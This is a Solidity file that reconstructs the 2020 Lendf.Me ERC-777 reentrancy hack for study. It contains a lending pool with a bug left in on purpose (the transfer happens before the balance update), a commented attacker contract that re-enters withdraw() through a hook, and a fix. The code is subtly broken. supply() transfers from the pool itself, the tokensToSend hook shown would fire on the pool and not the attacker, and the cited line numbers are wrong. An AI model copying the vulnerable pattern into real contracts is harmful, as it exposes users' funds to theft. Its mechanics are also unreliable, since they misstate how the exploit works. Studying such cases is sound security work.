// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Lendf.Me - ERC-777 Reentrancy Vulnerability
 * @notice This contract demonstrates the vulnerability that led to the Lendf.Me hack
 * @dev April 19, 2020 - $25M stolen through ERC-777 token hooks reentrancy
 *
 * VULNERABILITY: ERC-777 reentrancy via tokensToSend hook
 *
 * ROOT CAUSE:
 * The withdraw() function transfers ERC-777 tokens BEFORE updating user balances.
 * ERC-777 tokens trigger a tokensToSend() hook on the sender during transfer,
 * allowing the attacker to re-enter withdraw() before their balance is updated.
 *
 * ATTACK VECTOR:
 * 1. Attacker supplies ERC-777 tokens (imBTC) to the lending pool
 * 2. Attacker calls withdraw() to withdraw tokens
 * 3. During token transfer, ERC-777 calls attacker's tokensToSend() hook
 * 4. In the hook, attacker calls withdraw() again
 * 5. Since balance hasn't been updated, attacker withdraws again
 * 6. Process repeats until pool is drained
 *
 * Unlike classic reentrancy which uses fallback(), this exploits ERC-777's
 * tokensToSend hook mechanism.
 */

interface IERC777 {
    function transfer(address to, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

interface IERC1820Registry {
    function setInterfaceImplementer(
        address account,
        bytes32 interfaceHash,
        address implementer
    ) external;
}

contract VulnerableLendingPool {
    mapping(address => mapping(address => uint256)) public supplied;
    mapping(address => uint256) public totalSupplied;

    /**
     * @notice Supply tokens to the lending pool
     * @param asset The ERC-777 token to supply
     * @param amount Amount to supply
     */
    function supply(address asset, uint256 amount) external returns (uint256) {
        IERC777 token = IERC777(asset);

        // Transfer tokens from user
        require(token.transfer(address(this), amount), "Transfer failed");

        // Update balances
        supplied[msg.sender][asset] += amount;
        totalSupplied[asset] += amount;

        return amount;
    }

    /**
     * @notice Withdraw supplied tokens
     * @param asset The token to withdraw
     * @param requestedAmount Amount to withdraw (type(uint256).max for all)
     *
     * VULNERABILITY IS HERE:
     * The function transfers tokens BEFORE updating the user's balance.
     * For ERC-777 tokens, the transfer triggers tokensToSend() hook on the sender,
     * creating a reentrancy opportunity.
     *
     * Vulnerable pattern:
     * 1. Calculate withdrawal amount (line 86-88)
     * 2. Transfer tokens (line 91) <- EXTERNAL CALL WITH HOOK
     * 3. Update balances (line 94-95) <- TOO LATE!
     */
    function withdraw(
        address asset,
        uint256 requestedAmount
    ) external returns (uint256) {
        uint256 userBalance = supplied[msg.sender][asset];
        require(userBalance > 0, "No balance");

        // Determine actual withdrawal amount
        uint256 withdrawAmount = requestedAmount;
        if (requestedAmount == type(uint256).max) {
            withdrawAmount = userBalance;
        }
        require(withdrawAmount <= userBalance, "Insufficient balance");

        // VULNERABLE: Transfer before state update
        // For ERC-777, this triggers tokensToSend() callback
        IERC777(asset).transfer(msg.sender, withdrawAmount);

        // Update state (happens too late!)
        supplied[msg.sender][asset] -= withdrawAmount;
        totalSupplied[asset] -= withdrawAmount;

        return withdrawAmount;
    }

    /**
     * @notice Get user's supplied balance
     */
    function getSupplied(
        address user,
        address asset
    ) external view returns (uint256) {
        return supplied[user][asset];
    }
}

/**
 * Example ERC-777 attack contract:
 *
 * contract LendfMeAttacker {
 *     VulnerableLendingPool public pool;
 *     IERC777 public token;
 *     uint256 public iterations = 0;
 *
 *     // ERC-777 tokensToSend hook - called during transfer
 *     function tokensToSend(
 *         address,
 *         address,
 *         address,
 *         uint256 amount,
 *         bytes calldata,
 *         bytes calldata
 *     ) external {
 *         iterations++;
 *         if (iterations < 10 && pool.totalSupplied(address(token)) > 0) {
 *             pool.withdraw(address(token), type(uint256).max);  // Reenter!
 *         }
 *     }
 *
 *     function attack() external {
 *         token.approve(address(pool), type(uint256).max);
 *         pool.supply(address(token), 100 ether);
 *         pool.withdraw(address(token), type(uint256).max);
 *     }
 * }
 *
 * REAL-WORLD IMPACT:
 * - $25M stolen in April 2020
 * - All funds eventually recovered through whitehat/negotiations
 * - Highlighted dangers of ERC-777 token standard
 * - Led to reduced adoption of ERC-777 in DeFi
 *
 * FIX:
 * Update state BEFORE transferring tokens:
 *
 * function withdraw(address asset, uint256 requestedAmount) external returns (uint256) {
 *     uint256 userBalance = supplied[msg.sender][asset];
 *     require(userBalance > 0, "No balance");
 *
 *     uint256 withdrawAmount = requestedAmount == type(uint256).max
 *         ? userBalance
 *         : requestedAmount;
 *     require(withdrawAmount <= userBalance, "Insufficient balance");
 *
 *     // Update state FIRST
 *     supplied[msg.sender][asset] -= withdrawAmount;
 *     totalSupplied[asset] -= withdrawAmount;
 *
 *     // Then transfer
 *     IERC777(asset).transfer(msg.sender, withdrawAmount);
 *
 *     return withdrawAmount;
 * }
 *
 * Or use ReentrancyGuard modifier.
 *
 * VULNERABLE LINES:
 * - Line 91: ERC-777 transfer triggers tokensToSend hook before state update
 * - Line 94-95: Balance updates happen after external call
 *
 * KEY LESSON:
 * ERC-777 tokens can trigger callbacks during transfers.
 * Always update state before any token transfer, not just ETH transfers.
 * Consider ERC-777 hooks as potential reentrancy vectors.
 */
